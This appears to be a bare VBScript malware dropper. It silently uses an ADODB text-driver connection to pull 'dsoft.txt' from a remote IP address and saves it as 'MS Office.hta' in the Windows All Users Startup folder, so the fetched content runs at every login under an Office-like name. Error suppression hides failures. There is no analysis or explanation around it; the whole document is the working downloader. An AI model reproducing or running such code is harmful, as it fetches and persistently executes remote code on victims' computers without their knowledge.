on error resume next
Dim Conn, rs
Set Conn = CreateObject("ADODB.Connection")
Conn.Open "Driver={Microsoft Text Driver (*.txt; *.csv)};" & _
"Dbq=http://69.50.188.36;" & _
"Extensions=asc,csv,tab,txt;" & _
"Persist Security Info=False"
Dim sql
sql = "SELECT * from dsoft.txt"
set rs = conn.execute(sql)
set rs =CreateObject("ADODB.recordset")
rs.Open "SELECT * from dsoft.txt", conn
rs.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\MS Office.hta", adPersistXML
rs.close
conn.close